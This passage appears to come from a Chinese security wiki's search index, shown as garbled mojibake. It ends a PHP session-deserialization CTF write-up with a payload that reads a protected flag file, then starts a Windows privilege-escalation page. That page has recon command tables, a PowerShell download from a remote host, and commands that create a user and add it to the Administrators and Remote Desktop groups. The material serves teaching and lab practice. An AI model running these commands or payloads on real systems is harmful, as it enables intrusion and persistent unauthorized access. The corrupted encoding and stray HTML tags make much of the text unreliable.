æ­¤æˆ‘ä»¬åªéœ€è¦æŠŠpayloadï¼Œå½“ä¸­æ”¹ä¸ºprint_r(file_get_contents(/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php));å³å¯è·å–flag ?phpini_set(session.serialize_handler, php_serialize);session_start();class OowoO public $mdzz=print_r(file_get_contents(/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php));;$obj = new OowoO();echo serialize($obj);? å‚è€ƒæ–‡ç« https://xz.aliyun.com/t/2715 https://xz.aliyun.com/t/2613 https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf https://blog.csdn.net/qq_43431158articledetails99544797 https://www.cnblogs.com/or4nge/p/13439974.html https://blog.zsxsoft.com/post/38 https://paper.seebug.org/680/ https://www.freebuf.com/articles/web/182231.html https://www.freebuf.com/vuls/202819.html"},{"title":"windows ææƒ","path":"/wiki/å†…ç½‘/ææƒ/windows ææƒ.html","content":"åŸºç¡€çŸ¥è¯†1.ç”¨æˆ·å’Œæƒé™æ¨¡å‹ç”¨æˆ·è´¦æˆ·ï¼ˆUser Accountï¼‰ï¼šWindows ç³»ç»Ÿä¸­ï¼Œç”¨æˆ·å¯ä»¥æ‹¥æœ‰ä¸åŒçš„æƒé™å’Œè§’è‰²ã€‚ç®¡ç†å‘˜è´¦æˆ·ï¼ˆAdministratorï¼‰ï¼šæ‹¥æœ‰ç³»ç»Ÿçš„å®Œå…¨æ§åˆ¶æƒé™ã€‚ æ ‡å‡†ç”¨æˆ·ï¼ˆStandard Userï¼‰ï¼šå…·æœ‰å—é™çš„æƒé™ï¼Œä¸èƒ½å¯¹ç³»ç»Ÿè¿›è¡Œé‡è¦çš„æ›´æ”¹ã€‚ å—é™ç”¨æˆ·ï¼ˆRestricted Userï¼‰ï¼šæƒé™æ›´å°‘ï¼Œå‡ ä¹ä¸èƒ½ä¿®æ”¹ç³»ç»Ÿè®¾ç½®ã€‚ ç³»ç»Ÿè´¦æˆ·ï¼ˆSYSTEMï¼‰ï¼šè¿™æ˜¯ Windows æ“ä½œç³»ç»Ÿå†…æ ¸çš„æƒé™çº§åˆ«ï¼Œæ¯”ç®¡ç†å‘˜æ›´é«˜ã€‚æ”»å‡»è€…é€šè¿‡æå‡æƒé™ï¼Œå¾€å¾€ä¼šäº‰å–ç³»ç»Ÿæƒé™ã€‚ UACï¼ˆç”¨æˆ·å¸æˆ·æ§åˆ¶ï¼‰ï¼šWindows çš„ä¸€ä¸ªå®‰å…¨ç‰¹æ€§ï¼Œç”¨äºé˜²æ­¢æ¶æ„è½¯ä»¶é€šè¿‡è·å¾—ç®¡ç†å‘˜æƒé™æ¥ç ´åç³»ç»Ÿã€‚å³ä½¿æ˜¯ç®¡ç†å‘˜è´¦æˆ·ï¼Œä¹Ÿéœ€è¦é¢å¤–ç¡®è®¤æ‰èƒ½æ‰§è¡Œé«˜æƒé™æ“ä½œã€‚ 2.è®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL)Windows è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰æ˜¯ç”¨äºæ§åˆ¶å¯¹è®¡ç®—æœºèµ„æºï¼ˆå¦‚æ–‡ä»¶ã€æ–‡ä»¶å¤¹ã€æ³¨å†Œè¡¨é¡¹ç­‰ï¼‰è®¿é—®æƒé™çš„æœºåˆ¶ã€‚å®ƒå¸®åŠ©å®šä¹‰å“ªäº›ç”¨æˆ·æˆ–ç»„å¯ä»¥è®¿é—®ç‰¹å®šèµ„æºï¼Œä»¥åŠä»–ä»¬å¯ä»¥æ‰§è¡Œå“ªäº›æ“ä½œï¼ˆå¦‚è¯»å–ã€å†™å…¥ã€ä¿®æ”¹ç­‰ï¼‰ã€‚ACL ç”±ä¸€ç³»åˆ— è®¿é—®æ§åˆ¶æ¡ç›®ï¼ˆACEï¼‰ ç»„æˆï¼Œæ¯ä¸ª ACE åŒ…å«ä»¥ä¸‹ä¿¡æ¯ï¼š ä¸»ä½“ï¼ˆSubjectï¼‰ï¼šè¯·æ±‚è®¿é—®èµ„æºçš„ç”¨æˆ·ã€ç»„æˆ–è®¡ç®—æœºã€‚ è®¿é—®æƒé™æ©ç ï¼ˆAccess Maskï¼‰ï¼šå®šä¹‰å…è®¸æˆ–æ‹’ç»çš„æƒé™ï¼ˆå¦‚è¯»å–ã€å†™å…¥ã€æ‰§è¡Œç­‰ï¼‰ã€‚ ç»§æ‰¿æ ‡å¿—ï¼ˆInheritance Flagï¼‰ï¼šæŒ‡ç¤ºå­å¯¹è±¡æ˜¯å¦ç»§æ‰¿çˆ¶å¯¹è±¡çš„ ACLã€‚ æŸ¥çœ‹æ–‡ä»¶çš„ ACLï¼š icacls æ–‡ä»¶è·¯å¾„ æ›´æ”¹æ–‡ä»¶çš„ ACLï¼š icacls æ–‡ä»¶è·¯å¾„ grant ç”¨æˆ·å:æƒé™ deny ç”¨æˆ·å:æƒé™ inheritance:çº§åˆ« å…¶ä¸­ï¼š grantï¼šæˆäºˆæƒé™ã€‚ denyï¼šæ‹’ç»æƒé™ã€‚ inheritanceï¼šè®¾ç½®ç»§æ‰¿æ ‡å¿—ã€‚ æƒé™å¯ä»¥æ˜¯ï¼š Fï¼šå®Œå…¨æ§åˆ¶ã€‚ Mï¼šä¿®æ”¹ã€‚ RXï¼šè¯»å–å’Œæ‰§è¡Œã€‚ ç»§æ‰¿çº§åˆ«å¯ä»¥æ˜¯ï¼š Nï¼šæ— ç»§æ‰¿ã€‚ Rï¼šåªç»§æ‰¿è¯»å–æƒé™ã€‚ Dï¼šç»§æ‰¿æ‰€æœ‰æƒé™ã€‚ 3.å®‰å…¨æ ‡è¯†ç¬¦ (SID)å®‰å…¨æ ‡è¯†ç¬¦ï¼ˆSIDï¼‰ ç”¨äºå”¯ä¸€æ ‡è¯†ç”¨æˆ·ã€ç»„æˆ–è®¡ç®—æœºã€‚SID æ˜¯ä¸€ç§å­—ç¬¦ä¸²ï¼Œç”¨æ¥æ ‡è¯†ä¸èµ„æºè®¿é—®ç›¸å…³çš„ä¸»ä½“ S-1-5-18 (LocalSystem)S-1-5-19 (LocalService)S-1-5-20 (NetworkService)S-1-5-32-544 (Administrators)S-1-5-32-545 (Users)S-1-5-32-550 (PrintOperators) æŸ¥è¯¢ SID wmic useraccount get name,sid SID è§£æ 19922 S-1-5-21-273206267-380918465-181388736-1001 Vultop S-1-5-21-1205915028-4293886087-4092552726-1001 S-1-ï¼šè¿™æ˜¯ SID çš„é€šç”¨å‰ç¼€ï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªä¿®è®¢ç‰ˆä¸º 1 çš„ SIDã€‚ ä¿®è®¢ç‰ˆæœ¬ï¼šSID æ˜¯ä¸º Windows NT 4.0 åŠä»¥åçš„ç‰ˆæœ¬åˆ›å»ºçš„ã€‚ 5ï¼šä¿®è®¢çº§åˆ«ï¼Œè¡¨ç¤ºè¿™æ˜¯ NT 4.0 ä»¥åçš„ç‰ˆæœ¬ã€‚ 21ï¼šè¡¨ç¤ºé¢å‘ SID çš„é¢†åŸŸï¼ˆåœ¨ Active Directory ç¯å¢ƒä¸­ï¼Œé€šå¸¸æ˜¯åŸŸçš„ç›¸å¯¹æ ‡è¯†ç¬¦ï¼‰ã€‚ é¢†åŸŸä¿¡æ¯ï¼šè¯¥ SID å¯èƒ½å±äºä¸€ä¸ªå…·æœ‰ç›¸å¯¹æ ‡è¯†ç¬¦ï¼ˆRIDï¼‰ä¸º â€œ21â€ çš„åŸŸã€‚ 1205915028ï¼šé¢å‘æœºæ„çš„å®‰å…¨æ ‡è¯†ç¬¦ï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ª GUIDï¼‰ã€‚ é¢å‘æœºæ„ï¼šç”±å…·æœ‰ GUID â€œ1205915028â€ çš„é¢å‘æœºæ„åˆ›å»ºã€‚ 4293886087 å’Œ 4092552726ï¼šè¡¨ç¤ºä¸é¢å‘æœºæ„ SID ç›¸å…³è”çš„å­æƒå¨å€¼ã€‚ å­æƒå¨å€¼ï¼šè¯´æ˜ SID å¦‚ä½•è¿›ä¸€æ­¥ç»†åˆ†å’Œç®¡ç†ã€‚ 1001ï¼šè¿™æ˜¯ç‰¹å®šä¸»ä½“çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œå¦‚ç”¨æˆ·ã€ç»„æˆ–æœåŠ¡è´¦æˆ·ã€‚ å”¯ä¸€æ ‡è¯†ç¬¦ï¼šæœ€åçš„æ•°å­—ï¼ˆå¦‚ â€œ1001â€ï¼‰æ ‡è¯†ç‰¹å®šçš„ç”¨æˆ·æˆ–æœåŠ¡è´¦æˆ·ã€‚ é’ˆå¯¹ S-1-5-21-1004336348-1177238915-682003330-512è¿›è¡Œè§£æï¼Œå¯ä»¥çŸ¥é“ SID çš„ç‰ˆæœ¬å·æ˜¯ 1ä¸»æ ‡è¯†å€¼æ˜¯ 5ï¼Œä»£è¡¨ NT æƒé™åŸŸç›¸å…³çš„å­æ ‡è¯†å€¼æ˜¯ 21-1004336348-1177238915-682003330RID æ˜¯ 512ï¼Œä»£è¡¨ DomainAdmins 4.åŸºæœ¬å‘½ä»¤ å‘½ä»¤ æè¿° font style=color:rgb(51, 51, 51);systeminfo/font æ‰“å°ç³»ç»Ÿä¿¡æ¯ font style=color:rgb(51, 51, 51);whoami/font è·å–å½“å‰ç”¨æˆ·å font style=color:rgb(51, 51, 51);whoami /priv/font åˆ—å‡ºå½“å‰å¸æˆ·æƒé™ font style=color:rgb(51, 51, 51);ipconfig/font ç½‘ç»œé…ç½®ä¿¡æ¯ font style=color:rgb(51, 51, 51);ipconfig /displaydns/font æ˜¾ç¤º DNS ç¼“å­˜ font style=color:rgb(51, 51, 51);route print/font æ‰“å°è·¯ç”±è¡¨ font style=color:rgb(51, 51, 51);arp -a/font æ‰“å° ARP è¡¨ font style=color:rgb(51, 51, 51);hostname/font è·å–ä¸»æœºå font style=color:rgb(51, 51, 51);net user/font åˆ—å‡ºç”¨æˆ· font style=color:rgb(51, 51, 51);net localgroup/font åˆ—å‡ºæ‰€æœ‰ç»„ font style=color:rgb(51, 51, 51);net view \\\\127.0.0.1/font åˆ—å‡ºæ‰“å¼€åˆ°å½“å‰è®¡ç®—æœºçš„ä¼šè¯ font style=color:rgb(51, 51, 51);net session/font åˆ—å‡ºå…¶ä»–æœºå™¨æ‰“å¼€çš„ä¼šè¯ font style=color:rgb(51, 51, 51);netsh firewall show config/font æ˜¾ç¤ºé˜²ç«å¢™é…ç½® font style=color:rgb(51, 51, 51);DRIVERQUERY/font åˆ—å‡ºå·²å®‰è£…çš„é©±åŠ¨ font style=color:rgb(51, 51, 51);tasklist /svc/font åˆ—å‡ºæœåŠ¡ä»»åŠ¡ font style=color:rgb(51, 51, 51);net start/font åˆ—å‡ºå¯åŠ¨çš„æœåŠ¡ font style=color:rgb(51, 51, 51);dir /s foo/font åœ¨ç›®å½•ä¸­æœç´¢åŒ…å«æŒ‡å®šå­—ç¬¦çš„é¡¹ç›® font style=color:rgb(51, 51, 51);sc query/font åˆ—å‡ºæ‰€æœ‰æœåŠ¡ font style=color:rgb(51, 51, 51);sc qc ServiceName/font æ‰¾åˆ°æŒ‡å®šæœåŠ¡çš„è·¯å¾„ font style=color:rgb(51, 51, 51);shutdown /r /t 0/font ç«‹å³é‡å¯ font style=color:rgb(51, 51, 51);type file.txt/font æ‰“å°æ–‡ä»¶å†…å®¹ font style=color:rgb(51, 51, 51);icacls C:\\Example/font åˆ—å‡ºæƒé™ font style=color:rgb(51, 51, 51);wmic qfe get Caption,Description,HotFixID,InstalledOn/font åˆ—å‡ºå·²å®‰è£…çš„è¡¥ä¸ font style=color:rgb(51, 51, 51);(New-Object System.Net.WebClient).DownloadFile(http://host/file,C:\\LocalPath)/font åˆ©ç”¨ PowerShell è¿œç¨‹ä¸‹è½½æ–‡ä»¶åˆ°æœ¬åœ° font style=color:rgb(51, 51, 51);accesschk.exe -qwsu Group/font ä¿®æ”¹å¯¹è±¡æƒé™ $ query user #æŸ¥çœ‹ç”¨æˆ·ç™»é™†æƒ…å†µ$ whoami #å½“å‰ç”¨æˆ·æƒé™$ set #ç¯å¢ƒå˜é‡$ä¸»æœºå #ä¸»æœºå$ systeminfo #æŸ¥çœ‹å½“å‰ç³»ç»Ÿç‰ˆæœ¬ä¸è¡¥ä¸ä¿¡æ¯$ ver #æŸ¥çœ‹å½“å‰æœåŠ¡å™¨æ“ä½œç³»ç»Ÿç‰ˆæœ¬$ net user #æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯$ net start #æŸ¥çœ‹å½“å‰è®¡ç®—æœºå¼€å¯æœåŠ¡åç§°$ netstat -ano #æŸ¥çœ‹ç«¯å£æƒ…å†µ$ netstat -ano|find 3389 #æŸ¥çœ‹æŒ‡å®šç«¯å£$ tasklist #æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹å ç”¨çš„ç«¯å£$ taskkil /im xxx.exe /f #å¼ºåˆ¶ç»“æŸæŒ‡å®šè¿›ç¨‹$ taskkil -PID pid # ç»“æŸæŸä¸ªpidå·çš„è¿›ç¨‹$ tasklist /svc|find TermService # æŸ¥çœ‹æœåŠ¡pidå·$ wmic os get title # æŸ¥çœ‹ç³»ç»Ÿå$ wmic Product get name,version # æŸ¥çœ‹å½“å‰å®‰è£…ç¨‹åº$ wmic qfe get Description,HotFixID,InstalledOn # æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯$ wmic qfe get Description,HotFixID,InstalledOn | å¼ºåˆ¶ç»“æŸæŒ‡å®šè¿›ç¨‹$ findstr /C: KB4346084 /C: KB4509094 # å®šä½ç‰¹å®šè¡¥ä¸#æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·$ net user username(ç”¨æˆ·å) password(å¯†ç ) /add # æ·»åŠ æ™®é€šç”¨æˆ·$ net localgroup adminstrators username /add # æŠŠæ™®é€šç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç”¨æˆ·ç»„#å¦‚æœè¿œç¨‹æ¡Œé¢è¿æ¥ä¸ä¸Šå¯ä»¥æ·»åŠ è¿œç¨‹æ¡Œé¢ç»„$ net localgroup Remote Desktop Users username / add é¡¹ç›®ï¼ˆItemï¼‰ å‘½ä»¤æ£€æŸ¥é¡¹ï¼ˆCommandCheckï¼‰ ç›®çš„ï¼ˆWhyï¼‰ ç³»ç»Ÿä¸è¡¥ä¸ï¼ˆSystem Patchesï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);systeminfo/fontï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);wmic qfe get/font ç¡®å®šæ“ä½œç³»ç»Ÿç‰ˆæœ¬ã€å®‰è£…æ—¥æœŸåŠå·²å®‰è£…çš„çƒ­ä¿®å¤è¡¥ä¸ï¼ˆhotfixesï¼‰ã€‚ å½“å‰èº«ä»½ä¸æƒé™ï¼ˆCurrent Identity Privilegesï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);whoami/fontï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);whoami /priv/fontï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);whoami /all/font è¯†åˆ«å½“å‰ç”¨æˆ·ä»¤ç‰Œã€æƒé™ï¼ˆå¦‚SeImpersonateã€SeDebugç­‰ï¼‰åŠç”¨æˆ·ç»„ä¿¡æ¯ã€‚ ç”¨æˆ·ä¸ç»„ï¼ˆUsers Groupsï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);net user/fontï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);net localgroup administrators/font æšä¸¾æœ¬åœ°ç”¨æˆ·ã€ç®¡ç†å‘˜ç»„æˆå‘˜ã€‚ æœåŠ¡ä¸å¯åŠ¨é¡¹ï¼ˆServices Startupï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sc query state=all/fontï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sc qc æœåŠ¡å/font æŸ¥æ‰¾æœåŠ¡ã€å¯åŠ¨æ¨¡å¼åŠäºŒè¿›åˆ¶è·¯å¾„ã€‚ è®¡åˆ’ä»»åŠ¡ï¼ˆScheduled Tasksï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);schtasks /query /fo LIST /v/font æšä¸¾è®¡åˆ’ä»»åŠ¡åŠè¯¦ç»†ä¿¡æ¯ã€‚ æ–‡ä»¶ç³»ç»Ÿä¸ACLï¼ˆFile System ACLï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);icacls C:\\Windows\\System32/fontï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);icacls/font [æ•æ„Ÿç›®å½•] è¯†åˆ«å¯å†™å…¥çš„æ•æ„Ÿç›®å½•æˆ–ACLæƒé™é…ç½®é”™è¯¯ã€‚ æ³¨å†Œè¡¨é¡¹ï¼ˆè¯»å–ï¼‰ï¼ˆRegistry Keys (read)ï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);reg query HKLM\\SYSTEM\\CurrentControlSet\\Services/fontï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run/font å¯¼å‡ºæœåŠ¡é”®å€¼ã€è‡ªåŠ¨è¿è¡Œï¼ˆAutoRunï¼‰æ¡ç›®ç­‰ã€‚ è¿›ç¨‹ä¸é•œåƒè·¯å¾„ï¼ˆProcesses Image Pathsï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);tasklist /v/fontï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);wmic process get name,executablepath/font è¯†åˆ«ç‰¹æƒè¿›ç¨‹åŠå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ã€‚ ç¯å¢ƒå˜é‡ï¼ˆEnvironment Variablesï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);set/font æ£€æŸ¥PATHã€TEMPã€PSModulePathç­‰æ˜¯å¦å­˜åœ¨å¯åŠ«æŒçš„æ¡ç›®ã€‚ äº‹ä»¶æ—¥å¿—Sysmonï¼ˆEvent Logs Sysmonï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);wevtutil qe Security /q:* /f:text/fontï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational/fontï¼ˆPowerShellï¼‰ æ”¶é›†è¿›ç¨‹åˆ›å»ºã€æœåŠ¡å˜æ›´ç­‰æ—¥å¿—ï¼›è‹¥å­˜åœ¨Sysmonï¼Œåˆ™æ£€æŸ¥å…¶äº‹ä»¶ã€‚ UACé˜²å¾¡è½¯ä»¶EDRçŠ¶æ€ï¼ˆUAC Defender EDR stateï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA/fontï¼ˆæ£€æŸ¥UACï¼‰ï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);Get-MpComputerStatus/fontï¼ˆPowerShellï¼Œæ£€æŸ¥DefenderçŠ¶æ€ï¼‰ äº†è§£é˜²å¾¡æ€åŠ¿ï¼ˆå¦‚UACæ˜¯å¦å¯ç”¨ã€DefenderEDRçŠ¶æ€ï¼‰åŠå¯ç”¨çš„ç¼“è§£æªæ–½ã€‚ 5.å¸¸ç”¨å‘½ä»¤ ç±»åˆ« å‘½ä»¤ ä¸»è¦å‚æ•° åŠŸèƒ½æè¿° æ–‡ä»¶ç®¡ç† font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);dir/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/s/font é€’å½’æœç´¢å­ç›®å½• font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/b/font ç®€æ˜æ ¼å¼(ä»…è·¯å¾„å’Œæ–‡ä»¶å) a:[d h font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/p/font åˆ†é¡µæ˜¾ç¤º font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/w/font å®½åˆ—è¡¨æ ¼å¼ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);copy/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/y/font è¦†ç›–æ—¶ä¸æç¤º font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/v/font éªŒè¯æ–‡ä»¶å†™å…¥æ­£ç¡®æ€§ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);xcopy/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/e/font å¤åˆ¶ç›®å½•å’Œå­ç›®å½•(å«ç©ºç›®å½•) font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/h/font å¤åˆ¶éšè—å’Œç³»ç»Ÿæ–‡ä»¶ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);robocopy/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/mir/font é•œåƒç›®å½•æ ‘(åŒæ­¥åˆ é™¤) font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/mt:n/font å¤šçº¿ç¨‹å¤åˆ¶(nçº¿ç¨‹æ•°) font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);del/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/f/font å¼ºåˆ¶åˆ é™¤åªè¯»æ–‡ä»¶ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/s/font ä»æ‰€æœ‰å­ç›®å½•åˆ é™¤æŒ‡å®šæ–‡ä»¶ è¿›ç¨‹ç®¡ç† font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);tasklist/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/v/font è¯¦ç»†æ¨¡å¼(æ˜¾ç¤ºæ›´å¤šä¿¡æ¯) font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/svc/font æ˜¾ç¤ºè¿›ç¨‹åŒ…å«çš„æœåŠ¡ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/m [module]/font æ˜¾ç¤ºåŠ è½½çš„DLLæ¨¡å— font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/fi filter/font è¿‡æ»¤å™¨æ¡ä»¶ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);taskkill/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/im name/font æŒ‰æ˜ åƒåç§°ç»“æŸè¿›ç¨‹ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/pid id/font æŒ‰è¿›ç¨‹IDç»“æŸè¿›ç¨‹ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/f/font å¼ºåˆ¶ç»ˆæ­¢è¿›ç¨‹ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/t/font ç»ˆæ­¢å­è¿›ç¨‹ ç½‘ç»œè¯Šæ–­ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);ping/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-t/font æŒç»­pingç›´åˆ°æ‰‹åŠ¨åœæ­¢ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-n count/font æŒ‡å®šå‘é€è¯·æ±‚æ¬¡æ•° font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-l size/font size å‘é€ç¼“å†²åŒºå¤§å° font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-w timeout/font è¶…æ—¶æ—¶é—´(æ¯«ç§’) font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);ipconfig/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/all/font æ˜¾ç¤ºå®Œæ•´é…ç½®ä¿¡æ¯ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/release/font é‡Šæ”¾IPåœ°å€ç§Ÿçº¦ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/renew/font ç»­è®¢IPåœ°å€ç§Ÿçº¦ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/flushdns/font æ¸…é™¤DNSè§£æç¼“å­˜ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/displaydns/font æ˜¾ç¤ºDNSè§£æç¼“å­˜å†…å®¹ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);netstat/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-a/font æ˜¾ç¤ºæ‰€æœ‰è¿æ¥å’Œç›‘å¬ç«¯å£ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-n/font ä»¥æ•°å­—å½¢å¼æ˜¾ç¤ºåœ°å€å’Œç«¯å£å· font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-b/font æ˜¾ç¤ºåˆ›å»ºè¿æ¥çš„åº”ç”¨ç¨‹åº font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-o/font æ˜¾ç¤ºæ‹¥æœ‰çš„è¿›ç¨‹ID font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);tracert/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-d/font ä¸å°†åœ°å€è§£ææˆä¸»æœºå font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-h max_hops/font æœç´¢ç›®æ ‡çš„æœ€å¤§è·ƒç‚¹æ•° ç£ç›˜ç®¡ç† font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);chkdsk/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/f/font ä¿®å¤ç£ç›˜ä¸Šçš„é”™è¯¯ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/r/font å®šä½åæ‰‡åŒºå¹¶æ¢å¤å¯è¯»ä¿¡æ¯ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/x/font å¿…è¦æ—¶å¼ºåˆ¶å¸è½½å· font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);format/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/fs:type/font æŒ‡å®šæ–‡ä»¶ç³»ç»Ÿ(FAT32NTFS) font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/q/font å¿«é€Ÿæ ¼å¼åŒ– font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/a:size/font åˆ†é…å•å…ƒå¤§å° ç³»ç»ŸæœåŠ¡ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sc/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);query/font æŸ¥è¯¢æœåŠ¡çŠ¶æ€ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);start/font å¯åŠ¨æœåŠ¡ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);stop/font åœæ­¢æœåŠ¡ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);create/font åˆ›å»ºæœåŠ¡ ç³»ç»Ÿä¿¡æ¯ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);systeminfo/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/fo format/font æŒ‡å®šè¾“å‡ºæ ¼å¼(tablelistcsv) font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sfc/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/scannow/font ç«‹å³æ‰«ææ‰€æœ‰å—ä¿æŠ¤çš„ç³»ç»Ÿæ–‡ä»¶ font style=color:rgba(0, 